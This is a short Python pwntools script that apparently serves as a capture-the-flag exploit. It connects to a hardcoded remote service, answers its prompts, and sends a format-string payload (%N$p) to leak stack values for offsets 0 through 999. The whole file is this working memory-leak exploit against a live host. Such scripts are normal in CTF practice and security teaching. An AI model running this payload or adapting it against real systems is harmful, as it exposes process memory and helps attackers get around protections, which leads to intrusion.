from pwn import *

context.log_level = "CRITICAL"

def leakAddr(memOffset):
	r = remote('34.185.167.212',30851)
	r.recvuntil('Do you have the control?')
	r.sendline('yaku')
	r.recvuntil('Do you have the control?')
	r.sendline('yaku')
	r.recvuntil('Do you have the control?\r\n')
	r.sendline(' | %' + str(memOffset) + '$p | ')
	resp = r.recvuntil('Do you have the control?')
	r.close()
	return resp.decode().split(' | ')[3]

for i in range(1000):
	print(str(i) + " " + leakAddr(i))
